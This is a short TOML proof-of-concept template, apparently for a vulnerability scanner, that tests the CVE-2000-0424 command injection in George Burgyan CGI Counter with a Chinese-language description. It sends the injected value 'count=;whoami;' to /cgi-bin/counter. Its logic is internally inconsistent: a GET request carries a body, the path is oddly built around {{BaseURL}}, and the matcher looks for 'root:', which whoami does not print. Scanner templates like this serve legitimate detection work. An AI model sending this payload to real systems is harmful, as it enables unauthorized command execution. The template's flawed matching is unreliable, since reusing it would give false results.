[info]
author = "ave"
description = "验证 CVE-2000-0424 漏洞，攻击者可通过恶意的 count 参数向 CGI Counter 程序发送特制请求利用缺乏输入验证实现命令注入。检测 CGI 二进制文件是否存在异常处理或无效验证，帮助器控制台实现完整的命令执行验证。使用无害检测载荷如 whoami 或 ls。"
id = "POC-AVE-2000-0345"
name = "George Burgyan CGI Counter 4.0.2/4.0.7 输入验证漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0345"]
vuln_id = [
    "CVE-2000-0424",
    "AVE-2000-0345",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/counter"
protocol = "http"

[poc.requests.body]
content = "count=;whoami;"
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
